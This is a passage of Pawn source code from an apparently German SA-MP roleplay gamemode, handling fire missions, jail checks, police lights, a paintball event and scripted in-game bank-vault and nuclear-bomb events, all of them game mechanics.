	    SetPlayerCheckpoint(spielerid,6369.9453,-7813.1846,4.3716-1,5.0);
	}
	else if(feuerzahl == 6)
	{
	    cpaktiv[spielerid] = 1;
	    SetPlayerCheckpoint(spielerid,1591.0822,-9519.0684,6.3945-1,5.0);
	}
}
forward Feueranzeigen(zahl);
public Feueranzeigen(zahl)
{
	if(zahl == 0)
	{
	    feuerzahl = 0;
		FraktionsNachricht(4, COLOR_HQ, "HQ: Das Trucker Depot brennt! Löschen Sie das Feuer! (Checkpoint)");
		FraktionsNachricht(3, COLOR_HQ, "HQ: Das Trucker Depot brennt! Löschen Sie das Feuer! (Checkpoint)");
	}
	else if(zahl == 1)
	{
	    feuerzahl = 1;
	    FraktionsNachricht(4, COLOR_HQ, "HQ: Das Farmfeld brennt! Löschen Sie das Feuer! (Checkpoint)");
		FraktionsNachricht(3, COLOR_HQ, "HQ: Das Farmfeld brennt! Löschen Sie das Feuer! (Checkpoint)");
	}
	else if(zahl == 2)
	{
	    feuerzahl = 2;
	    FraktionsNachricht(4, COLOR_HQ, "HQ: Die Tankstelle in Santa Felton brennt! Löschen Sie das Feuer! (Checkpoint)");
		FraktionsNachricht(3, COLOR_HQ, "HQ: Die Tankstelle in Santa Felton brennt! Löschen Sie das Feuer! (Checkpoint)");
	}
	else if(zahl == 3)
	{
	    feuerzahl = 3;
	    FraktionsNachricht(4, COLOR_HQ, "HQ: Die Ballas Base in Lake Sorten brennt! Löschen Sie das Feuer! (Checkpoint)");
		FraktionsNachricht(3, COLOR_HQ, "HQ: Die Ballas Base in Lake Sorten brennt! Löschen Sie das Feuer! (Checkpoint)");
	}
	else if(zahl == 4)
	{
	    feuerzahl = 4;
	    FraktionsNachricht(4, COLOR_HQ, "HQ: Ein Haus in Portland brennt! Löschen Sie das Feuer! (Checkpoint)");
		FraktionsNachricht(3, COLOR_HQ, "HQ: Ein Haus in Portland brennt! Löschen Sie das Feuer! (Checkpoint)");
	}
	else if(zahl == 5)
	{
	    feuerzahl = 5;
	    FraktionsNachricht(4, COLOR_HQ, "HQ: Der Friedhof in Santa Felton brennt! Löschen Sie das Feuer! (Checkpoint)");
		FraktionsNachricht(3, COLOR_HQ, "HQ: Der Friedhof in Santa Felton brennt! Löschen Sie das Feuer! (Checkpoint)");
	}
	else if(zahl == 6)
	{
	    feuerzahl = 6;
	    FraktionsNachricht(4, COLOR_HQ, "HQ: Ein Haus Nahe des LSPD brennt! Löschen Sie das Feuer! (Checkpoint)");
		FraktionsNachricht(3, COLOR_HQ, "HQ: Ein Haus Nahe des LSPD brennt! Löschen Sie das Feuer! (Checkpoint)");
	}
}
cmd:einsatz(playerid,params[])
{
    if(!IstSpielerInFrak(playerid,4) && !IstSpielerInFrak(playerid,3)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Mitglied des Fire & Rescue Departments!");
    Feueranzeigen2(playerid);
	if(feuerzahl == 0)
	{
		SendClientMessage(playerid,COLOR_HQ, "HQ: Das Trucker Depot brennt! Löschen Sie das Feuer!");
	}
	else if(feuerzahl == 1)
	{
	    SendClientMessage(playerid,COLOR_HQ, "HQ: Das Farmfeld brennt! Löschen Sie das Feuer!");
	}
	else if(feuerzahl == 2)
	{
	    SendClientMessage(playerid,COLOR_HQ,"HQ: Die Tankstelle in Santa Felton brennt! Löschen Sie das Feuer!");
	}
	else if(feuerzahl == 3)
	{
	    SendClientMessage(playerid,COLOR_HQ, "HQ: Die Ballas Base in Lake Sorten brennt! Löschen Sie das Feuer!");
	}
	else if(feuerzahl == 4)
	{
	    SendClientMessage(playerid,COLOR_HQ,"HQ: Ein Haus in Portland brennt! Löschen Sie das Feuer!");
	}
	else if(feuerzahl == 5)
	{
	    SendClientMessage(playerid,COLOR_HQ, "HQ: Der Friedhof in Santa Felton brennt! Löschen Sie das Feuer!");
	}
	else if(feuerzahl == 6)
	{
	    SendClientMessage(playerid,COLOR_HQ, "HQ: Ein Haus Nahe des LSPD brennt! Löschen Sie das Feuer!");
	}
	else
	{
	    SendClientMessage(playerid,COLOR_HQ,"Es gibt momentan keinen Brand!");
	}
	return 1;
}

forward Updateracc(playerid);
public Updateracc(playerid)
{
	if(GetPlayerSkin(playerid) == 0)
    {
    	SetPlayerSkin(playerid,2);
    	SpielerInfo[playerid][uSkin] = 2;
    	SpielerInfo[playerid][uZiviSkin] = 2;
		SpielerInfo[playerid][uZiviFrak] = 0;
    }
	if(in_event[playerid]== true && !IsPlayerInArea(playerid,6521.5132,-7661.0122,6613.9253,-7569.0703))
	{
		new rand = random(sizeof(event_pb_spawns));
		Teleport(playerid,event_pb_spawns[rand][0],event_pb_spawns[rand][1],event_pb_spawns[rand][2]);
		SetPlayerFacingAngle(playerid,event_pb_spawns[rand][3]);
		Freeze(playerid); SetTimerEx("Unfreeze",2000,0,"d",playerid);
	}
	if(SpielerInfo[playerid][uStrafe] == -1)
	{
		if(SpielerInfo[playerid][uKnastZeit] >= 1)
		{
		    if(SpielerInfo[playerid][uGefangen] == 1)
		    {
			    if(!IsPlayerInArea(playerid,1555.1100,-9483.3125,1567.0007,-9476.2441))
			    {
			        new rand = random(sizeof(KnastSpawns));
					Streamer_UpdateEx(playerid,KnastSpawns[rand][0],KnastSpawns[rand][1],KnastSpawns[rand][2]);
					Teleport(playerid,KnastSpawns[rand][0],KnastSpawns[rand][1],KnastSpawns[rand][2]);
					SendClientMessage(playerid,COLOR_RED,"Zurück in die Zelle mit dir!");
				}
			}
			else if(SpielerInfo[playerid][uGefangen] == 2)
		    {
			    if(!IsPlayerInArea(playerid, 6485.5288, -7894.6108, 6495.5791, -7882.7920))
			    {
			        new rand = random(sizeof(KnastSpawnsSF));
					Streamer_UpdateEx(playerid,KnastSpawnsSF[rand][0],KnastSpawnsSF[rand][1],KnastSpawnsSF[rand][2]);
					Teleport(playerid,KnastSpawnsSF[rand][0],KnastSpawnsSF[rand][1],KnastSpawnsSF[rand][2]);
					SendClientMessage(playerid,COLOR_RED,"Zurück in die Zelle mit dir!");
				}
			}
			else if(SpielerInfo[playerid][uGefangen] == 3)
		    {
			    if(!IsPlayerInArea(playerid, 4502.1270, -8757.2402, 4550.9307, -8683.7998))
			    {
			        new rand = random(sizeof(KnastSpawnsARMY));
					Streamer_UpdateEx(playerid,KnastSpawnsARMY[rand][0],KnastSpawnsARMY[rand][1],KnastSpawnsARMY[rand][2]);
					Teleport(playerid,KnastSpawnsARMY[rand][0],KnastSpawnsARMY[rand][1],KnastSpawnsARMY[rand][2]);
					SendClientMessage(playerid,COLOR_RED,"Zurück in die Zelle mit dir!");
				}
			}
		}
		if(IsPlayerInArea(playerid,-3141.1724,-2942.8044,2981.1282,3222.2522) && SpielerInfo[playerid][uEingeloggt] == 1 && SpielerInfo[playerid][uAdmin] != 5)
		{
			Teleport(playerid,1826.9099,-9344.4756,4.4203);
			SetPlayerFacingAngle(playerid,90);
			Freeze(playerid); SetTimerEx("Unfreeze",3000,0,"d",playerid);
		    SendClientMessage(playerid,COLOR_RED,"FEHLER: Du hattest einen Lagg, deshalb hat etwas nicht laden können, Du wurdest zurück teleportiert.");
		}
	}
	else
	{
	    if(!IsPlayerInArea(playerid,8942.4404,-9597.2119,8992.3438,-9546.0088) && SpielerInfo[playerid][uStrafe] > 0)
	    {
	        Teleport(playerid,8966.1924,-9567.3359,2.3988);
	        Freeze(playerid); SetTimerEx("Unfreeze",3000,0,"d",playerid);
	    }
	}
	return 1;
}
new PoliceLightFlashID = 0;
forward PoliceLightFlash();
public PoliceLightFlash()
{
    PoliceLightFlashID++;
    if(PoliceLightFlashID > 1)
    {
        for(new x = 0; x < MAX_VEHICLES; x++)
        {
            if(IsValidVehicle(x) && PoliceLight[x] != INVALID_OBJECT_ID) SetDynamicObjectMaterialText(PoliceLight[x],0,"POLIZEI\nBITTE FOLGEN",OBJECT_MATERIAL_SIZE_256x128,\"Arial",27,0,0xFFFF0000,0x00000000,1);
        }
        PoliceLightFlashID = 0;
    }
    else
    {
        for(new x = 0; x < MAX_VEHICLES; x++)
        {
            if(IsValidVehicle(x) && PoliceLight[x] != INVALID_OBJECT_ID) SetDynamicObjectMaterialText(PoliceLight[x],0," ",OBJECT_MATERIAL_SIZE_256x128,\"Arial",20,0,0xFFFF0000,0x00000000,1);
        }
    }
}

stock IntToHex(int)
{
	new str[18];
	format(str, sizeof(str), "0x%x", int);
	return strval(str);
}

stock HexToInt(hex)
{
    new
    str[15];
    format(str, sizeof(str), "%i", hex);
    return strval(str);
}
stock GetAdminName(level) {//N0SKILL
    new name[30];
    switch(level) {
        case 0: format(name, sizeof(name), "Spieler");
        case 1: format(name, sizeof(name), "{FFFA00}Supporter");
        case 2: format(name, sizeof(name), "{FF3C00}Moderator");
        case 3: format(name, sizeof(name), "{0FC000}Administrator");
        case 4: format(name, sizeof(name), "{007FFF}Server Manager");
        case 5: format(name, sizeof(name), "{AF0000}Projektleiter");
    }
    return name;
}
stock create_event(playerid,Float:sjp,evart)
{

	new art[16],str[160];
	event_art=evart;
	event_jackpot=sjp;event_state=1;
	switch(event_art)
	{
		case 1:{art="Paintball";event_join_player(playerid);}
		case 2:{art="Kart";}
	}
	eventTM=SetTimer("event_ct_tm",60000,true);
	format(str,sizeof(str),"{FFBF00}[Event Park] %s hat ein {9F81F7}'Paintball'{FFBF00} Event gestartet. Start Jackpot: {9F81F7}%0.000f${FFBF00}, /addjackpot" ,PlayerName(playerid),event_jackpot);
	SendClientMessageToAll(-1,str);
	SendClientMessageToAll(-1,"{FFBF00}[Event Park] Das Event startet in > {9F81F7}3{FFBF00} < Minuten!");
}
stock event_join_player(playerid)
{
	new str[160];
	in_event[playerid]=true;
	event_players++;
	format(str,sizeof(str),"{FFBF00}[Event Park] {9F81F7}%s{FFBF00} hat die Arena betreten. Spieler: {9F81F7}%i{FFBF00}",PlayerName(playerid),event_players);
	sendEventMsg(str);
	event_spawn_player(playerid);
	GameTextForPlayer(playerid, "Event beigetreten.", 4000, 3);
	jpbereits[playerid] = 0;
	return 1;
}
stock event_leave_player(playerid)
{
	new str[160];
	event_players--;
	format(str,sizeof(str),"{FFBF00}[Event Park] {9F81F7}%s{FFBF00} hat die Arena verlassen. Spieler: {9F81F7}%i{FFBF00}",PlayerName(playerid),event_players);
	sendEventMsg(str);
	ResetWeapons(playerid);
	GameTextForPlayer(playerid, "Event verlassen.", 4000, 3);
	in_event[playerid]=false;
	jpbereits[playerid] = 0;
	return 1;
}
stock event_spawn_player(playerid)
{
	switch(event_art)
	{
		case 1:{
			new rand = random(sizeof(event_pb_spawns));
			SetPlayerPos(playerid,event_pb_spawns[rand][0],event_pb_spawns[rand][1],event_pb_spawns[rand][2]);
			SetPlayerFacingAngle(playerid,event_pb_spawns[rand][3]);
			Freeze(playerid); SetTimerEx("Unfreeze",2000,0,"d",playerid);
			if(event_state==3){GebeWaffe(playerid,24,1200);}
		}
		case 2:{/*Kommt beim Kart*/}
	}
	return 1;
}
stock event_start()
{
	print("event 0");
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    print("event 1");
		if(IsPlayerConnected(i) && in_event[i] == true)
		{
		    print("event 2");
			switch(event_art)
			{
				case 1:{event_kills[i]=0;GebeWaffe(i,24,200);}
			}
			print("event 4");
		}
	}
	return 1;
}
stock event_stop()
{
	if(event_players == 1)
	{
		for(new i = 0; i < MAX_PLAYERS;i++)
		{
			if(in_event[i] == true)
			{
			    event_leaderID = i;
			    break;
   			}
	 	}
	}
	new str[160];
	switch(event_art)
	{
		case 1:
		{
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i) && in_event[i] == true)
				{
					SendDeathMessage(6000, 5005, 255);
					GebeLeben(event_leaderID,99);
					in_event[i]=false;event_kills[i]=0;ResetWeapons(i);
					Teleport(i,6483.6177,-7704.7822,4.3935);
					SetPlayerFacingAngle(i,130.5811);
					jpbereits[i] = 0;
					TogglePlayerControllable(i, 1);
				}
			}
		}
	}
	if(event_players == 0)
	{
		format(str,sizeof(str),"{FFBF00}[Event Park] {FFBF00}Das Event hat niemand gewonnen! Grund: Keine Spieler");
		SendClientMessageToAll(-1,str);
		event_firstblood=false;
		event_state=0;event_players=0;event_jackpot=0.0;event_ct=5;event_art=0;KillTimer(eventTM3);
		event_leaderID=-1;
	}
	else
	{
	    if(event_players == 1)
	    {
	    	format(str,sizeof(str),"{FFBF00}[Event Park] {FFBF00}Das Event hat niemand gewonnen! Grund: Nur ein Spieler!");
			SendClientMessageToAll(-1,str);
			format(str,sizeof(str),"{FFBF00}[Event Park] {9F81F7}%s{FFBF00} bekommt den Jackpot als letzter Spieler! Jackpot: {9F81F7}%0.000f${FFBF00}",PlayerName(event_leaderID),event_jackpot);
			SendClientMessageToAll(-1,str);
			
	    }
	    else
	    {
	    	format(str,sizeof(str),"{FFBF00}[Event Park] {9F81F7}%s{FFBF00} hat das Event gewonnen! Jackpot: {9F81F7}%0.000f${FFBF00}",PlayerName(event_leaderID),event_jackpot);
			SendClientMessageToAll(-1,str);
	    }
		GebeGeld(event_leaderID,event_jackpot);
		event_firstblood=false;
		event_state=0;event_players=0;event_jackpot=0.0;event_ct=5;event_art=0;KillTimer(eventTM3);
		event_leaderID=-1;
	}
	return 1;
}
stock sendEventMsg(const etext[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i) && in_event[i] == true)
		{
			SendClientMessage(i,-1,etext);
		}
	}
	return 1;
}
public event_ct_tm2()
{
	event_ct--;
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i) && in_event[i] == true)
		{
			new str[200];
			format(str,sizeof(str),"{FFBF00}[Event Park] Das Event beginnt in %i Sekunden! Es endet in 5. Minuten. Jackpot: {9F81F7}%0.000f${FFBF00}",event_ct,event_jackpot);
			event_start();
			new strct[50];
			format(strct,sizeof(strct),"~g~Start in:~y~ %i",event_ct);
			GameTextForPlayer(i,strct, 4000, 3);
			SendClientMessage(i,-1,str);
			if(event_players == 1 || event_players == 0)
			{
			    event_stop();
			}
		}
	}
	if(event_ct==0)
	{
		event_state=3;
		KillTimer(eventTM2);event_ct=5;
		eventTM3=SetTimer("event_ct_tm3",60000*5,true);
	}
	return 1;
}
public event_ct_tm3()
{
	event_ct -= 5;new str[128];
	format(str,sizeof(str),"{FFBF00}[Event Park] Das Event geht noch: {9F81F7}%i{FFBF00} Minuten",event_ct);
	sendEventMsg(str);
	if(event_ct <= 0)
	{
	    format(str,sizeof(str),"{FFBF00}[Event Park] Das Event ist vorbei, Spieler werden gefreezt für die Ausrechnung!",event_ct);
		sendEventMsg(str);
		SetTimer("Eventstopende",10000,0);
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i) && in_event[i] == true)
			{
				TogglePlayerControllable(i, 0);
			}
		}
	}
	return 1;
}
forward Eventstopende();
public Eventstopende()
{
    event_stop();
}
public event_ct_tm()
{
	print("event 100");
	switch(event_state)
	{
		case 1:
		{
		    print("event 200");
			event_ct--;
			if(event_ct==0)
			{
				event_state=2;SendClientMessageToAll(-1,"{FFBF00}[Event Park] Das Event startet nun. Die Arena wurde geschlossen!");
				KillTimer(eventTM);
				event_state=2;
				event_ct=5;
				eventTM2=SetTimer("event_ct_tm2",1000,true);
			}
		}
	}
	return 1;
}
forward explodesf();
public explodesf() //Bank SF
{
    CreateExplosion(6417.7085,-7754.5229,4.3636, 6, 14.0);
    Banktimer = 1;
    DestroyObject(Banktuer);
    SetTimer("NewDoor",1000*60*15,false);
    return 1;
}
forward Banktor2();
public Banktor2()
{
	Banktimer2 = 0;
	bankdarf = 1;
    return 1;
}
forward NewDoor2();
public NewDoor2()
{
	Banktuerls = CreateObject(19799, 1590.65271, -8550.65918, 2.60410,   0.00000, 0.00000, 0.00000);
    return 1;
}
forward Banktor();
public Banktor()
{
	Banktimer = 0;
    return 1;
}

forward tresortur(playerid);
public tresortur(playerid)
{
	CreateExplosion(1436.43591, -7563.22510, 11.88010,12,15);
	DestroyDynamicObject(Tresortuer);
	zunderklauen = 1;
	Tresortuer = CreateDynamicObject(19619, 1436.43591, -7563.22510, 11.88010,   0.0000, 0.0000, 105.0000);
	SendClientMessage(playerid,COLOR_RED,"Der Tresor ist offen. Laufe hin un drücke 'H' für den Zünder.");
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
 		StopAudioStreamForPlayer(i);
	}
}
forward Bombeexplodetur1();
public Bombeexplodetur1()
{
    tresordarf = 1;
	CreateExplosion(1427.43787, -7537.79297, 19.24610,6,40);
	DestroyDynamicObject(TraegerTur[0]);
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
 		StopAudioStreamForPlayer(i);
	}
}
forward Bombeexplodetur2();
public Bombeexplodetur2()
{
    tresordarf = 1;
	CreateExplosion(1428.59412, -7541.41357, 12.19320,6,40);
	DestroyDynamicObject(TraegerTur[1]);
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
 		StopAudioStreamForPlayer(i);
	}
}
forward Tragerneurauben();
public Tragerneurauben()
{
	tuersetzen1 = 1;
	tuertimer1 = 180;
	tuersetzen2 = 1;
	tuertimer2 = 180;
	tuersetzen3 = 1;
	tuertimer3 = 180;
	treagerstop = 0;
}
forward Bombeexplodetur3();
public Bombeexplodetur3()
{
    tresordarf = 1;
	CreateExplosion(1429.62158, -7577.70264, 4.17059,6,40);
	DestroyDynamicObject(TraegerTur[2]);
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
 		StopAudioStreamForPlayer(i);
	}
}
forward NewDoor();
public NewDoor()
{
 	Banktuer = CreateObject(19799, 6419.48340, -7755.87500, 4.84720,   0.00000, 0.00000, 90.00000);
 	printf("Banktuer: %d", Banktuer);
    return 1;
}
public Armytorzu()
{
	MoveObject(armyhacktor,4346.05273, -8817.67773, 5.84800,0.1,0.00000, 0.00000, 0.00000);
    return 1;
}
forward Bombewieder();
public Bombewieder()
{
	atombreak = 0;
}
forward Atombombe();
public Atombombe()
{
	MoveDynamicObject(Rakete,4479.2637, -8703.7529, 8.4806+60,20);
	SetTimer("Atombombe2",3000,0);
}
forward Atombombeabbruchtot();
public Atombombeabbruchtot()
{
	KillTimer(Bombentimer5);
	SendClientMessageToAll(COLOR_BLUE,"____________________________________________________________________________;");
    SendClientMessageToAll(COLOR_WHITE,"* {2E2EFE}[STAAT-NEWS]{FFFFFF}: Der Spieler mit dem Zünder wurde eliminiert!");
    SendClientMessageToAll(COLOR_WHITE,"* Alle Spieler können den Bunker wieder verlassen!");
 	SendClientMessageToAll(COLOR_BLUE,"____________________________________________________________________________");
 	sireneaktivbomb = 0;
    for(new i = 0; i < GetMaxPlayers();i++)
    {
        StopAudioStreamForPlayer(i);
    }
 	sirenean = 0;
 	bombenspieler = -1;

}
forward Atombombeabbruch();
public Atombombeabbruch()
{
	KillTimer(Bombentimer5);
	SendClientMessageToAll(COLOR_BLUE,"____________________________________________________________________________;");
    SendClientMessageToAll(COLOR_WHITE,"* {2E2EFE}[STAAT-NEWS]{FFFFFF}: Der Spieler mit dem Zünder wurde eliminiert!");
    SendClientMessageToAll(COLOR_WHITE,"* Alle Spieler können den Bunker wieder verlassen!");
 	SendClientMessageToAll(COLOR_BLUE,"____________________________________________________________________________");
 	sireneaktivbomb = 0;
    for(new i = 0; i < GetMaxPlayers();i++)
    {
        StopAudioStreamForPlayer(i);
    }
 	sirenean = 0;
 	bombenspieler = -1;

}
forward Atombombe2();
public Atombombe2()
{
	new string[256];
	CreateExplosion(4479.2637, -8703.7529, 8.4806+30,6,1000);
	CreateExplosion(4479.2637+10, -8703.7529, 8.4806+30,6,1000);
	CreateExplosion(4479.2637, -8703.7529-10, 8.4806+10,6,1000);
	CreateExplosion(4479.2637+10, -8703.7529, 8.4806+15,6,1000);
	CreateExplosion(4479.2637, -8703.7529-10, 8.4806+15,6,1000);
 	SendClientMessageToAll(COLOR_RED,"|------------------------------------------------------------------------------|");
    SendClientMessageToAll(COLOR_WHITE,"* Die Bombe ist explodiert! Der Bunker kann verlassen werden!");
    SendClientMessageToAll(COLOR_WHITE,"* Die Einsatzkräfte Fire & Rescue sind vorort und kann verstrahlte");
    SendClientMessageToAll(COLOR_WHITE,"* Personen heilen! Sollte es niemanden geben, kaufen Sie sich ein");
    SendClientMessageToAll(COLOR_WHITE,"* Verstrahlungskit im Fire & Rescue Shop!");
 	SendClientMessageToAll(COLOR_RED,"|------------------------------------------------------------------------------|");
	new verstrahlungen = 0;
	for(new i = 0; i < GetMaxPlayers();i++)
	{
	    if(!IsPlayerInArea(i,1610.8860,-9202.8115,1624.1249,-9189.6377))
		{
		    if(SpielerInfo[i][uEingeloggt] == 1)
		    {
			    new Float:PLX,Float:PLY,Float:PLZ;
			    GetPlayerPos(i,PLX,PLY,PLZ);
			    CreateExplosion(PLX, PLY, PLZ+30,6,5);
			    SendClientMessage(i,COLOR_YELLOW,"Du wurdest verstrahlt! Lasse dich von einem Sanitäter heilen!");
			    TextDrawHideForPlayer(i, atomtext[0]);
				TextDrawHideForPlayer(i, atomtext[1]);
				TextDrawHideForPlayer(i, atomtext[2]);
			    TextDrawShowForPlayer(i, atomtext[0]);
				TextDrawShowForPlayer(i, atomtext[1]);
				TextDrawShowForPlayer(i, atomtext[2]);
			    SpielerInfo[i][uVerstrahlt] = 1;
			    verstrahlungen++;
			}
     	}
		else
		{
			SendClientMessage(i,COLOR_GREEN,"Du wurdest nicht verstrahlt!");
		}
	}
	format(string,sizeof(string),"Es wurden insgesamt %d Personen verstrahlt!",verstrahlungen);
	SendClientMessageToAll(COLOR_ORANGE,string);
	
	SetTimer("Atombombe3",1000*60,0);
	SetWeather(9);
}
forward Atombombe3();
public Atombombe3()
{
	new Float:rando = random(10000) + 20000;
	SendFormatMessage(bombenspieler,COLOR_GREEN,"Für deinen Bombenanschlag erhälst du %.2f$!",rando);
	GebeGeld(bombenspieler,rando);
	MoveDynamicObject(Rakete,4479.2637, -8703.7529, 8.4806,60);
	SetTimer("Atombombe4",1000*60*2,0);
	SetTimer("Atombombe5",1000*60*10,0);
}
forward Atombombe5();
public Atombombe5()
{
	SetWeather(5);
}
forward Atombombe4();
public Atombombe4()
{
    sireneaktivbomb = 0;
    for(new i = 0; i < GetMaxPlayers();i++)
    {
        StopAudioStreamForPlayer(i);
    }
}
forward armytorsp(playerid);
public armytorsp(playerid)
{
    armytorspam[playerid] = 0;
	return 1;
}
forward Busfahrerreset(playerid);
public Busfahrerreset(playerid)
{
    Buslinie[playerid] = 0;
	return 1;
}
forward AusfuhrBla();
public AusfuhrBla()
{
	return 1;
}



public OnRconCommand(cmd[])
{
    if(!strcmp(cmd, "hello", true))
    {
        SendClientMessageToAll(0xFFFFFFAA, "Hello World!");
        print("You said hello to the world."); // This will appear to the player who typed the rcon command in the chat in white
        return 1;
    }
    return 0;
}
